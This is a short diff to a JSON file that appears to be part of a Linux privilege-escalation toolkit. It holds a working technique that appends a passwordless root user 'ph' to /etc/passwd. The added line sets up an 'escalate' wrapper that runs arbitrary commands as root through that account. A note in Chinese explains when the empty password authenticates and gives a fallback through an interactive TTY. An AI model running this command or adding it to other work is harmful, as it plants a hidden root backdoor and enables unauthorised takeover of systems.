@@ -29,6 +29,7 @@
     "cmd": "echo 'ph::0:0:root:/root:/bin/bash' >> /etc/passwd",
     "verify": "script -qc \"su ph -c 'id'\" /dev/null </dev/null 2>&1",
     "expect": "uid=0\\(root\\)",
+    "escalate": {"user": "ph", "wrapper": "script -qc \"su ph -c %CMD%\" /dev/null </dev/null 2>&1"},
     "note": "追加 uid=0 用户 ph 后以 root 执行命令。注意：① 空密码（passwd 字段留空）在 shadow 不可写 + shadow:compat 的机器上才认证通过，写哈希会 su 失败；② 无 script 时可用已有的交互 TTY 会话手工 su ph。"
   },
   {
